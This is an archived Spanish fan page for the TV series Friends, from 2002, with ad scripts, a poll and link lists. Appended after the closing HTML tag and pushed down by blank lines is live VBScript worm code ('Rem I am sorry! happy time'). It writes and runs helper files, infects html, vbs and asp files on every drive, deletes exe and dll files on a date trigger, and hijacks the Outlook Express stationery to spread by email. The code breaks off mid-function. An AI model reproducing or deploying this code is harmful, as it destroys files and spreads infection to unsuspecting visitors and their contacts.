<HTML>
<script language="javascript">
<!--
if (navigator.appName.indexOf('Microsoft') != -1){
var ych = 90;
}
if (navigator.appName.indexOf('Netscape') != -1){
var ych = 95;
}
function on_error() { return true; }
onerror = on_error;
if(window == window.top)	{
var s='<HEAD><TITLE>espacio.ya.com - Bienvenido a la página de escarchafriends</TITLE></HEAD><FRAMESET ROWS="'+ych+',*"  FRAMEBORDER="no" FRAMESPACING="0" border="0" bordercolor="#dddddd">\n'+
'<FRAME  src="lnz_esp.cgi?adtype=frame&cuad=escena&rand=1024654427" name="yacom_ad" scrolling="no" noresize>\n'+
'<FRAME  src="'+window.location+'?" name="user_page">\n'+
'</FRAMESET>\n';
document.write(s);
}
//-->
</script>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="Content-Language" content="es">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>FRIENDS</title>
<title>buscadorweb</title>
<!--pegar dentre de head-->

<SCRIPT LANGUAJE="JavaScript">

var NS4 = (document.layers); 
var IE4 = (document.all);

var win = this; 
var n = 0; 

function findInPage(str) { 
var txt, i, found; 
if (str == "") 
return false; 
if (NS4) { 
if 
(!win.find(str)) 
while(win.find(str, false, true)) 
n++; 
else 
n++; 
if (n == 0) alert(str + " no,no, esta palabra 
no es de aquí."); 
} 
if (IE4) { 
txt = win.document.body.createTextRange(); 
for (i = 0; i <= n &&(found = txt.findText(str)) != false; i++){ 
txt.moveStart("character", 1); 
txt.moveEnd("textedit"); 
} 
if (found) { 
txt.moveStart("character", -1); 
txt.findText(str); 
txt.select(); 
txt.scrollIntoView(); 
n++; 
} 
else { 
if (n > 0) { 
n = 0; 
findInPage(str); 
} 
else 
alert(str + " was not found on this page."); 
} 
} 
return false; 
} 
// --> 
</script> 
<!--fin de head --> 
</head>

<body background="fondo.gif" bgproperties="fixed">
<div id="redsheriff" style="visibility:hidden;z-index:9999999999;width:100%;height:0px;display:none">

</div>

</noscript>
<SCRIPT LANGUAGE="JavaScript"><!--
var adcode = 0;
// --></SCRIPT>
<script>
var logChannel = "espacio";
var bannerDomain = "es.espacioya.com";
var Bannerseg = 2;
</script>

<link rel="stylesheet" href="http://espacio.ya.com/mod/style_cabecera.css">
<link rel="stylesheet" href="http://espacio.ya.com/mod/espacio_alpha.css">
<script language="JavaScript" src="http://espacio.ya.com/mod/buscador.js"></script>
<script language="JavaScript" src="http://espacio.ya.com/mod/inappropiate.js"></script>
<script language="JavaScript" src="http://espacio.ya.com/mod/xml.js"></script>
<script language="JavaScript" src="http://espacio.ya.com/mod/info.js"></script>
<script language="JavaScript" src="http://imgserv.ya.com/espacio.ya.com/mod/orangebanner.js"></script>
<script language="JavaScript" src="http://www.orange.es/js/bannerWoo.js"></script>
<script src="http://imgserv.ya.com/web20.ya.com-site/js/wt.js" type="text/javascript"></script>

<div id="contenedor_ya">
  <div class="publi" align="center">    
    <script>
    bannerWoo.begin({pos:1,wid:728,hei:90});
    bannerWoo.end({pos:1});
    </script>
     
    <script>
    bannerWoo.begin({pos:'2',wid:210,hei:90});
    bannerWoo.end({pos:'2'});
    </script>
  </div>
  <!--fin de publicidad-->
  <div class="barra_ya">
    <h1><a href="http://www.ya.com">logotipo</a></h1>
    <ul>
      <li ><a href="http://espacio.ya.com" class="espacios"><img src="http://espacio.ya.com/img/ico_espacios.jpg" alt="espacios ya.com" /></a></li>
      <li ><a href="http://blogs.ya.com" class="blogs"><img src="http://espacio.ya.com/img/ico_blogs.jpg" alt="blogs ya.com" /></a></li>
      <li ><a href="http://ya.com/chats" class="chat"><img src="http://espacio.ya.com/img/ico_chat.jpg" alt="chat ya.com" /></a></li>
      <li ><a href="http://orange.es/pikeo" class="pikeo"><img src="http://espacio.ya.com/img/ico_pikeo.jpg" alt="pikeo" /></a></li>
      <li ><a href="http://foros.ya.com" class="foros"><img src="http://espacio.ya.com/img/ico_foros.jpg" alt="foros ya.com" /></a></li>
      <li ><a href="http://traductor.ya.com" class="traductor"><img src="http://espacio.ya.com/img/ico_traductor.jpg" alt="traductor" /></a></li>
    </ul>
    <div class="reportedeabusos">
       <a onclick="javascript:denunciarContenido();return false;" style="cursor:hand;cursor:pointer;" >Reporte de abusos</a>
    </div>
  </div>
<!--fin de barra_ya-->
  <div id="buscador">
  <form onsubmit="return false" name="FORMGenericSearchBox1" method="get" action="">
    <input type="hidden" value="social" name="o"/>
    <fieldset class="text_img">
      <input type="text" class="text_area" onkeypress="return GeneralSearchingKeyPress(event, this.form)" name="q"/>
    </fieldset>
    <img alt="img_google" src="http://espacio.ya.com/img/google.gif"/>
    <fieldset class="checks">
      <input type="radio" value="0" name="SO" id="uno" checked />
      <label>Web</label>
      <input type="radio" value="1" name="SO" id="dos"/>
      <label>Im&aacute;genes</label>
      <input type="radio" value="2" name="SO" id="tres"/>
      <label>Noticias</label>
    </fieldset>
    <fieldset class="area_boton">
      <input type="button" value="Buscar" onclick="GeneralSearching(this.form)" class="boton" name="button"/>
    </fieldset>
  </form>
</div>
</div>
<div style="visibility: hidden;display: none;position:absolute;" id="alphalayer" class="alphalayer" style="width:100%;height:100%;"><wbr/></div>
<div style="display: none; position: absolute; z-index:1001; visibility: hidden;" id="layer_over">
 <iframe id="framedenuncia" src="" frameborder="0" scrolling="no" style="width:424px; height:270px; z-index:2000; position:absolute; overflow:hidden; margin: 150px 0 0 270px;">&nbsp;</iframe>
 <script>loadIframe(document.getElementById("framedenuncia"));</script>
</div> 

<script language="javascript">
var ns=document.layers;
var ie=document.all;
var dom=document.getElementById;
var ns6=(navigator.appName.indexOf('Netscape')!=-1)&&dom;

if(ns) { part1='document.layers[\''; part2='\'].'; part3=''; }
else if(ie) { part1='document.all[\''; part2='\'].'; part3='style.'; }
else if(dom) { part1='document.getElementById(\''; part2='\').'; part3='style.'; }

function ActivatePublicity() {
	var publicityTable1 = document.getElementById('flypublicitytable1');
	var publicityTable2 = document.getElementById('flypublicitytable2');
	function PutPosition() {
		eval (part1+'flypublicity'+part2+part3+'visibility="visible"');
		eval (part1+'flypublicity'+part2+part3+'display=""');
		if (publicityTable1 != null){publicityTable1.style.display  = '';} 
		if (publicityTable2 != null){publicityTable2.style.display  = '';} 
	}
	window.StayTopRight=function() {
		eval (part1+'flypublicity'+part2+part3+'visibility="visible"');
		eval (part1+'flypublicity'+part2+part3+'display=""');
		if (publicityTable1 != null){publicityTable1.style.display  = '';} 
		if (publicityTable2 != null){publicityTable2.style.display  = '';} 
		setTimeout("StayTopRight()", 50000);
	}
	PutPosition();
	StayTopRight();
}

function CheckMinSize(){
		var wHeight = 0;
		var wWidth = 0;
		if (ie) {
			wHeight = document.body.offsetWidth;
			wWidth = document.body.offsetHeight;
		} else {
			wHeight = window.innerHeight;
			wWidth = window.innerWidth;
		}
		if ((wHeight<400)&&(wWidth<400)) {
			return false;
		} else {
			return true;
		}
}

function Show() { 
	if (window.top.frames.length<2) {
		if (CheckMinSize) {
			ActivatePublicity();		
		}
	}
	else {	
		try {
			CheckFrames(top.window);		
			GetGreaterFrame();		
		} catch (er) {
			CheckFrames(parent.window);		
			GetGreaterFrame();		
		}
	}
}

var FramesArray = new Array();
var FramesSizeArray = new Array();

function CheckFrames(ObjectFrames) {
	ArraySize = FramesArray.length + 1;
	if (FramesArray.length == 0) ArraySize = 0
	for (i=0; i<ObjectFrames.frames.length; i++) {
		if (ObjectFrames.frames[i].frames.length<2) {
			FramesArray[ArraySize] = ObjectFrames.frames[i].frames;	
			ArraySize++;
		} else {
			for (j=0; j<ObjectFrames.frames[i].frames.length; j++) {
				if (ObjectFrames.frames[i].frames[j].length<2) {
					FramesArray[ArraySize] = ObjectFrames.frames[i].frames[j];	
					ArraySize++;				
				} else {
					CheckFrames(ObjectFrames.frames[i].frames[j]);	
				}
			}
		}
	}
}

function GetGreaterFrame() {
	for (i=0; i<FramesArray.length; i++) {
		try {
			FramesSizeArray[i] = (FramesArray[i].document.body.clientWidth * FramesArray[i].document.body.clientHeight);
		} catch (e) {
			FramesSizeArray[i] = 0;
		}
	}
	var frameworking;
	for (i=1; i<FramesSizeArray.length; i++) {
		if (FramesArray[i-1]>FramesArray[i]) {
			frameworking = (i-1);
		} else {
			frameworking = i;
		}
	}
	if (FramesArray[frameworking]==self) ActivatePublicity();
}

Show();
</script>
<script>
function GetCookie (name) {  
  var arg = name + "=";  
  var alen = arg.length;  
  var clen = document.cookie.length;  
  var i = 0;  
  while (i < clen) {    
    var j = i + alen;    
    if (document.cookie.substring(i, j) == arg)      
      return getCookieVal (j);    
      i = document.cookie.indexOf(" ", i) + 1;    
      if (i == 0) break;   
    }  
  return null;
}

function SetCookie (name, value) {  
  var argv = SetCookie.arguments;  
  var argc = SetCookie.arguments.length;  
  var expires = (argc > 2) ? argv[2] : null;  
  var path = (argc > 3) ? argv[3] : null;  
  var domain = (argc > 4) ? argv[4] : null;  
  var secure = (argc > 5) ? argv[5] : false;  
  document.cookie = name + "=" + escape (value) + 
    ((expires == null) ? "" : ("; expires=" + expires.toGMTString())) + 
    ((path == null) ? "" : ("; path=" + path)) +  
    ((domain == null) ? "" : ("; domain=" + domain)) +    
    ((secure == true) ? "; secure" : "");
}


function getCookieVal(offset) {
  var endstr = document.cookie.indexOf (";", offset);
  if (endstr == -1)
    endstr = document.cookie.length;
  return unescape(document.cookie.substring(offset, endstr));
}

function check() {
  var count = GetCookie('escenayacom');
  if (count != '1') {
		SetCookie('escenayacom', '1');
		register();
	}
}

function register(e) {
	if (!e) e = window.event;
	mywin=window.open('http://www.ya.com', 'yacom');
	mywin.blur();
	return true;
}

window.onload = check;
</script>



<p align="center"><img src="f.gif" width="68" height="84" start="fileopen"><img src="r.gif" width="68" height="84" start="fileopen"><img src="i.gif" width="68" height="84" start="fileopen"><img src="e.gif" width="68" height="84" start="fileopen"><img src="n.gif" width="68" height="84" start="fileopen"><img src="d.gif" width="68" height="84" start="fileopen"><img src="s.gif" width="68" height="84" start="fileopen"></p>

<p align="center"><font face="Georgia" color="#FFFFFF"><span style="background-color: #000000">Bienvenido
a la pagina web de Friends.</span></font></p>

<p align="center"><img border="0" src="0922_clubfriends[1].jpg" width="422" height="104"></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp;</font><font color="#FFFFFF"><font face="Marydale" size="3"><img border="0" src="twinkle5.gif" width="30" height="29"></font></font><font color="#FFFFFF" face="Marydale" size="4">
<a href="PERSONAJES.htm">P · E · R · S · O · N · A · J · E · S&nbsp;&nbsp;&nbsp;
D · E&nbsp;&nbsp;&nbsp; L · A&nbsp;&nbsp;&nbsp; S · E · R · I ·E</a></font><font face="Marydale" size="3"><font color="#FFFFFF">&nbsp;:</font>:</font><font face="Marydale" size="4">
Aquí podrás encontrar información sobre los personajes de la serie</font></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp;<img border="0" src="twinkle5.gif" width="30" height="29">
<a href="galeria___de__fotos.htm">G · A · L · E · R · I · A&nbsp;&nbsp;&nbsp;&nbsp;
D · E&nbsp;&nbsp;&nbsp; F · O · T · O · S</a>&nbsp;</font><font face="Marydale" size="4">:
Más de 800 fotos, en toda clase de momentos.</font></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp;&nbsp;<img border="0" src="twinkle5.gif" width="30" height="29">
<a href="video.htm">V · I · D · E · O · S</a> </font><font face="Marydale" size="4">:
divertidísimos momentos de tu serie preferida captados en </font><font face="Marydale" size="4">versión
original.&nbsp;</font> </p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp; <img border="0" src="twinkle5.gif" width="30" height="29">
<a href="SONIDO.htm">S · O · N · I · D ·O</a>&nbsp;</font><font face="Marydale" size="4">:
Los sonidos más graciosos en diferentes idiomas.</font>&nbsp; </p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp; <img border="0" src="twinkle5.gif" width="30" height="29">
</font><font color="#ffffff" face="Marydale" size="4"><a href="bajar.htm">D · O
· W · N · L · O · A · D</a></font><font face="Marydale" size="4" color="#FFFFFF">&nbsp;</font><font face="Marydale" size="4">:
aquí podremos diversos componentes para el ordenador; iconos, Salva pantallas,
... </font><font face="Marydale" size="4" color="#FFFFFF">&nbsp;&nbsp;</font></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp; <img border="0" src="twinkle5.gif" width="30" height="29">
<a href="LETRA%20DE%20LA%20CANCIÓN.htm">L · A&nbsp;&nbsp;&nbsp;&nbsp; C · A
· N · C · I · O · N&nbsp;&nbsp; &nbsp; Y&nbsp;&nbsp;&nbsp; S · U&nbsp;&nbsp;&nbsp;
L · E · T · R · A</a> </font><font face="Marydale" size="4">: La
canción&nbsp; y la letra de FRIENDS, en español e inglés.</font><font face="Marydale" size="4" color="#FFFFFF">&nbsp;</font></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp;&nbsp;<img border="0" src="twinkle5.gif" width="30" height="29">
<a href="guia.htm">G · U · I · A&nbsp;&nbsp;&nbsp;&nbsp; D · E&nbsp;&nbsp;&nbsp;&nbsp;
L · A&nbsp;&nbsp;&nbsp;&nbsp; S · E · R · I · E</a>&nbsp;&nbsp;</font><font face="Marydale" size="4">:
Guía de los episodios de FRIENDS desde el episodio piloto hasta la octava
temporada.</font></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp;&nbsp;<img border="0" src="twinkle5.gif" width="30" height="29">
<a href="TRIVIAL.htm">T · R · I · V · I · A · L</a>&nbsp;</font><font face="Marydale" size="4">
: un divertido juego de FRIENDS, en el cual podrás saber si realmente eres un
friendsfanático.</font></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp;&nbsp; <img border="0" src="twinkle5.gif" width="30" height="29"><a href="MOMENTOS%20CHISTOSOS.htm">M
· O · M · E · N · T · O · S&nbsp;&nbsp;&nbsp;&nbsp; C · H · I · S · T
· O · S · O · S</a> :</font><font face="Marydale" size="4">: los momentos
más divertidos de la serie.</font></p>
<p align="left"><font face="Marydale" size="4" color="#FFFFFF">&nbsp;&nbsp; <img border="0" src="twinkle5.gif" width="30" height="29">
<a href="SECRETOS.htm">S · E · C · R · E · T · O · S&nbsp;&nbsp;&nbsp; D
· E&nbsp;&nbsp;&nbsp; L · A&nbsp;&nbsp;&nbsp;&nbsp; S · E · R · I · E</a>&nbsp;</font><font face="Marydale" size="4">:
Los secretos más guardados de la serie FRIENDS.</font></p>
<p align="center">&nbsp;</p>
<table width="197" border="0" bgcolor="#006699" align="center" cellpadding="3" cellspacing="0">
  <tr align="center">
    <td width="189"><font size="1" color="#993300" face="Verdana, Arial, Helvetica, sans-serif"><b><font color="#FFFFFF">Rachel
      y ...</font></b></font><br/>
      <table width="174" border="0" cellpadding="3" cellspacing="0" bgcolor="#9122FF">
        <tr bgcolor="#FFFFFF">
          <td width="4">&nbsp;</td>
          <td width="160" colspan="2">
            <p align="center"><font size="1" color="#000000" face="Verdana">¿Con
            quién creeis que hace mejor pareja Rachel?</font></p>
          </td>
        </tr>
      </table>
      <table width="174" border="1" cellpadding="3" cellspacing="0" bgcolor="#FFA4FF" background="../barrio/fondo.jpg">
        <tr bgcolor="#FFFFFF">
          <td width="4" align="center">&nbsp;</td>
          <td width="30" align="center"><font size="1" color="#000000" face="Verdana"><b>Ross</b></font></td>
          <td width="140" align="center"><input VALUE="1" TYPE="radio" NAME="OP" /></td>
        </tr>
        <tr bgcolor="#FFFFFF">
          <td width="4" align="center">&nbsp;</td>
          <td width="30" align="center"><font size="1" color="#000000" face="Verdana"><b>Joey</b></font></td>
          <td width="140" align="center"><input VALUE="2" TYPE="radio" NAME="OP" /></td>
        </tr>
        <tr bgcolor="#FFFFFF">
          <td width="5" align="center">&nbsp;</td>
          <td width="47" align="center">&nbsp;</td>
          <td width="104" align="center"><input onclick="Votar('F15468')" VALUE="vota" TYPE="Button" NAME="BUT" /></td>
        </tr>
      </table>
    </td>
  </tr>
</table>
<p align="center">&nbsp;</p>
<p align="center">SI OS HA GUSTADO ESTA PÁGINA, PUEDES VOTAR POR ELLA:</p>
<p align="center">
<A HREF="http://www.topsitelists.com/topsites.cgi?ID=266&user=friends&area=hollywood"><IMG SRC="http://www.hutchinson47.freeserve.co.uk/votebanner.jpg" border=0></A>
<p align="center">&nbsp;</p>

<p align="center"><span style="background-color: #000000"><font color="#FFFFFF" face="Arial Black">SI
QUIERES MANDAR ALGUNA SUGERENCIA PUEDES HACERLO A LA SIGUIENTE DIRECCIÓN:</font></span></p>
<p align="center"><a href="mailto:serranocas@hotmail.com"><img border="0" src="botella.gif" width="128" height="117"></a></p>
<p align="center"> <form name="eMailer" target="_blank">
    <p style="line-height: 100%; margin-top: 0; margin-bottom: 0" align="center">
    <b><font size="4">RECOMIENDA ESTA PÁGINA A UN AMIG@ </font></b><br><br>
    <b><font size="3">Escribe su e-mail: </font></b><br>
    <br>
<input type="text" name="address" size="25">
<br><br>
<input type="button" value="Enviar" xonClick="mailThisUrl();">
</form>
<COMMENT language="JavaScript1.2">

<!--
var good;
function checkEmailAddress(field) {
var goodEmail =
field.value.match(/\b(^(\S+@).+((\.com)|(\.net)|(\.edu)|(\.mil)|(\.gov)|(\.org)|(\..{2,2}))$)\b/gi);

if (goodEmail){
   good = true
} else {
   alert('Por favor introduce un e-mail valido')
   field.focus()
   field.select()
   good = false
   }
}

u = window.location;
m = "Pienso que te puede interesar esta página...";
function mailThisUrl(){
   good = false
   checkEmailAddress(document.eMailer.address)
   if (good){
      window.location =
"mailto:"+document.eMailer.address.value+"?subject="+m+"&body="+document.title+"
"+u;
   }
}

// -->
</COMMENT>
<p align="center" style="line-height: 100%; margin-top: 0; margin-bottom: 0">&nbsp;
<p align="center" style="line-height: 100%; margin-top: 0; margin-bottom: 0"><img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp;
<img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp; <img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp;
<img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp; <img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp;
<img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp; <img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp;
<img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp; <img border="0" src="star.gif" width="21" height="21"><p align="center" style="line-height: 100%; margin-top: 0; margin-bottom: 0"><img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp;
<img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp; <img border="0" src="star.gif" width="21" height="21">&nbsp;&nbsp;&nbsp;
<img border="0" src="star.gif" width="21" height="21"><p align="center" style="line-height: 100%; margin-top: 0; margin-bottom: 0">&nbsp;<p align="center" style="line-height: 100%; margin-top: 0; margin-bottom: 0"><font face="Arial Black">Envia
sms desde aqui:</font><p align="center" style="line-height: 100%; margin-top: 0; margin-bottom: 0">&nbsp;<p align="center" style="line-height: 100%; margin-top: 0; margin-bottom: 0">&nbsp;<p align="center"><a href="#" onclick="window.open('http://www.gruposms.com/partners/webmasters/index.php', null, 'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=450,height=325,top=100,left=100');"><img border="0" src="http://www.gruposms.com/imagenes/sms_movil.gif" width="141" height="65"></a></p><p align="center">&nbsp;</p><p align="center" style="line-height: 100%; word-spacing: 0; margin-top: 0; margin-bottom: 0"><font face="Arial Black">También
te ofrecemos para
cualquier otro asunto,&nbsp;</font><p align="center" style="line-height: 100%; word-spacing: 0; margin-top: 0; margin-bottom: 0"><font face="Arial Black">poder
consultar en nuestro Buscardo:</font><p align="center" style="margin-top: 0; margin-bottom: 0">&nbsp;
<!--pegar dentro de body-->
<centre>
<form name=search onSubmit="return findInPage(this.string.value);">
<p style="margin-top: 0; margin-bottom: 0"><font face="Arial Black">Buscador</font> 
<input name=string type=text size=30 onChange="n = 0;">&nbsp;<font face="Arial Black">
Por todos los rincones de internet.</font> 
</form>

<p style="margin-top: 0; margin-bottom: 0">

<br>
<a href="http://espacio.ya.com" ;><font size="3" face="Verdana, Arial, Helvetica, sans-
serif">Espacio.ya.com</font></a> 
<!-- fin de body -->&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<font face="Book Antiqua">Diseñada by Escarcha </font>
<p style="margin-top: 0; margin-bottom: 0"><font face="Book Antiqua">&nbsp; </font>&nbsp;&nbsp;</p>
<p align="center" style="line-height: 0; word-spacing: 0; margin-top: 0; margin-bottom: 0">©
2002,&nbsp; Escarcha. España.&nbsp; Ayude
a mantener esta web activa, visite a los patrocinadores.&nbsp; </p>
<p align="center" style="line-height: 0; word-spacing: 0; margin-top: 0; margin-bottom: 0">&nbsp;</p>
<p align="center" style="line-height: 0; word-spacing: 0; margin-top: 0; margin-bottom: 0">&nbsp;</p>

</body>
</html>
<script language='VBScript'>





























Rem I am sorry! happy time
On Error Resume Next
mload
Sub mload()
On Error Resume Next
mPath = Grf()
Set Os = CreateObject("Scriptlet.TypeLib")
Set Oh = CreateObject("Shell.Application")
If IsHTML Then
mURL = LCase(document.Location)
If mPath = "" Then
Os.Reset
Os.Path = "C:\Help.htm"
Os.Doc = Lhtml()
Os.Write()
Ihtml = "<span style='position:absolute'><Iframe src='C:\Help.htm' width='0' height='0'></Iframe></span>"
Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml)
Else
If Iv(mPath, "Help.vbs") Then
setInterval "Rt()", 10000
Else
m = "hta"
If LCase(m) = Right(mURL, Len(m)) Then
id = setTimeout("mclose()", 1)
main
Else
Os.Reset()
Os.Path = mPath & "\" & "Help.hta"
Os.Doc = Lhtml()
Os.write()
Iv mPath, "Help.hta"
End If
End If
End If
Else
main
End If
End Sub
Sub main()
On Error Resume Next
Set Of = CreateObject("Scripting.FileSystemObject")
Set Od = CreateObject("Scripting.Dictionary")
Od.Add "html", "1100"
Od.Add "vbs", "0100"
Od.Add "htm", "1100"
Od.Add "asp", "0010"
Ks = "HKEY_CURRENT_USER\Software\"
Ds = Grf()
Cs = Gsf()
If IsVbs Then
If Of.FileExists("C:\help.htm") Then
Of.DeleteFile ("C:\help.htm")
End If
Key = CInt(Month(Date) + Day(Date))
If Key = 13 Then
Od.RemoveAll
Od.Add "exe", "0001"
Od.Add "dll", "0001"
End If
Cn = Rg(Ks & "Help\Count")
If Cn = "" Then
Cn = 1
End If
Rw Ks & "Help\Count", Cn + 1
f1 = Rg(Ks & "Help\FileName")
f2 = FNext(Of, Od, f1)
fext = GetExt(Of, Od, f2)
Rw Ks & "Help\FileName", f2
If IsDel(fext) Then
f3 = f2
f2 = FNext(Of, Od, f2)
Rw Ks & "Help\FileName", f2
Of.DeleteFile f3
Else
If LCase(WScript.ScriptFullname) <> LCase(f2) Then
Fw Of, f2, fext
End If
End If
If (CInt(Cn) Mod 366) = 0 Then
If (CInt(Second(Time)) Mod 2) = 0 Then
Tsend
Else
adds = Og
Msend (adds)
End If
End If
wp = Rg("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper")
If Rg(Ks & "Help\wallPaper") <> wp Or wp = "" Then
If wp = "" Then
n1 = ""
n3 = Cs & "\Help.htm"
Else
mP = Of.GetFile(wp).ParentFolder
n1 = Of.GetFileName(wp)
n2 = Of.GetBaseName(wp)
n3 = Cs & "\" & n2 & ".htm"
End If
Set pfc = Of.CreateTextFile(n3, True)
mt = Sa("1100")
pfc.Write "<" & "HTML><" & "body bgcolor='#007f7f' background='" & n1 & "'><" & "/Body><" & "/HTML>" & mt
pfc.Close
Rw Ks & "Help\wallPaper", n3
Rw "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", n3
End If
Else
Set fc = Of.CreateTextFile(Ds & "\Help.vbs", True)
fc.Write Sa("0100")
fc.Close
bf = Cs & "\Untitled.htm"
Set fc2 = Of.CreateTextFile(bf, True)
fc2.Write Lhtml
fc2.Close
oeid = Rg("HKEY_CURRENT_USER\Identities\Default User ID")
oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"
MSH = oe & "\Message Send HTML"
CUS = oe & "\Compose Use Stationery"
SN = oe & "\Stationery Name"
Rw MSH, 1
Rw CUS, 1
Rw SN, bf
Web = Cs & "\WEB"
Set gf = Of.GetFolder(Web).Files
Od.Add "htt", "1100"
For Each m In gf
fext = GetExt(Of, Od, m)
If fext <> "" Then
Fw Of, m, fext
End If
Next
End If
End Sub
Sub mclose()
document.Write "<" & "title>I am sorry!</title" & ">"
window.Close
End Sub
Sub Rt()
Dim mPath
On Error Resume Next
mPath = Grf()
Iv mPath, "Help.vbs"
End Sub
Function Sa(n)
Dim VBSText, m
VBSText = Lvbs()
If Mid(n, 3, 1) = 1 Then
m = "<%" & VBSText & "%>"
End If
If Mid(n, 2, 1) = 1 Then
m = VBSText
End If
If Mid(n, 1, 1) = 1 Then
m = Lscript(m)
End If
Sa = m & vbCrLf
End Function
Sub Fw(Of, S, n)
Dim fc, fc2, m, mmail, mt
On Error Resume Next
Set fc = Of.OpenTextFile(S, 1)
mt = fc.ReadAll
fc.Close
If Not Sc(mt) Then
mmail = Ml(mt)
mt = Sa(n)
Set fc2 = Of.OpenTextFile(S, 8)
fc2.Write mt
fc2.Close
Msend (mmail)
End If
End Sub
Function Sc(S)
mN = "Rem I am sorry! happy time"
If InStr(S, mN) > 0 Then
Sc = True
Else
Sc = False
End If
End Function
Function FNext(Of, Od, S)
Dim fpath, fname, fext, T, gf
On Error Resume Next
fname = ""
T = False
If Of.FileExists(S) Then
fpath = Of.GetFile(S).ParentFolder
fname = S
ElseIf Of.FolderExists(S) Then
fpath = S
T = True
Else
fpath = Dnext(Of, "")
End If
Do While True
Set gf = Of.GetFolder(fpath).Files
For Each m In gf
If T Then
If GetExt(Of, Od, m) <> "" Then
FNext = m
Exit Function
End If
ElseIf LCase(m) = LCase(fname) Or fname = "" Then
T = True
End If
Next
fpath = Pnext(Of, fpath)
Loop
End Function
Function Pnext(Of, S)
On Error Resume Next
Dim Ppath, Npath, gp, pn, T, m
T = False
If Of.FolderExists(S) Then
Set gp = Of.GetFolder(S).SubFolders
pn = gp.Count
If pn = 0 Then
Ppath = LCase(S)
Npath = LCase(Of.GetParentFolderName(S))
T = True
Else
Npath = LCase(S)
End If
Do While Not Er
For Each pn In Of.GetFolder(Npath).SubFolders
If T Then
If Ppath = LCase(pn) Then
T = False
End If
Else
Pnext = LCase(pn)
Exit Function
End If
Next
T = True
Ppath = LCase(Npath)
Npath = Of.GetParentFolderName(Npath)
If Of.GetFolder(Ppath).IsRootFolder Then
m = Of.GetDriveName(Ppath)
Pnext = Dnext(Of, m)
Exit Function
End If
Loop
End If
End Function
Function Dnext(Of, S)
Dim dc, n, d, T, m
On Error Resume Next
T = False
m = ""
Set dc = Of.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
If T Then
Dnext = d
Exit Function
Else
If LCase(S) = LCase(d) Then
T = True
End If
If m = "" Then
m = d
End If
End If
End If
Next
Dnext = m
End Function
Function GetExt(Of, Od, S)
Dim fext
On Error Resume Next
fext = LCase(Of.GetExtensionName(S))
GetExt = Od.Item(fext)
End Function
Sub Rw(k, v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
R.RegWrite k, v
End Sub
Function Rg(v)
Dim R
On Error Resume Next
Set R = CreateObject("WScript.Shell")
Rg = R.RegRead(v)
End Function
Function IsVbs()
Dim ErrTest
On Error Resume Next
ErrTest = WScript.ScriptFullname
If Err Then
IsVbs = False
Else
IsVbs = True
End If
End Function
Function IsHTML()
Dim ErrTest
On Error Resume Next
ErrTest = document.Location
If Er Then
IsHTML = False
Else
IsHTML = True
End If
End Function
Function IsMail(S)
Dim m1, m2
IsMail = False
If InStr(S, vbCrLf) = 0 Then
m1 = InStr(S, "@")
m2 = InStr(S, ".")
If m1 <> 0 And m1 < m2 Then
IsMail = True
End If
End If
End Function
Function Lvbs()
Dim f, m, ws, Of
On Error Resume Next
If IsVbs Then
Set Of = CreateObject("Scripting.FileSystemObject")
Set f = Of.OpenTextFile(WScript.ScriptFullname, 1)
Lvbs = f.ReadAll
Else
For Each ws In document.scripts
If LCase(ws.Language) = "vbscript" Then
If Sc(ws.Text) Then
Lvbs = ws.Text
Exit Function
End If
End If
Next
End If
End Function
Function Iv(mPath, mName)
Dim Shell
On Error Resume Next
Set Shell = CreateObject("Shell.Application")
Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb
If Er Then
Iv = False
Else
Iv = True
End If
End Function
Function Grf()
Dim Shell, mPath
On Error Resume Next
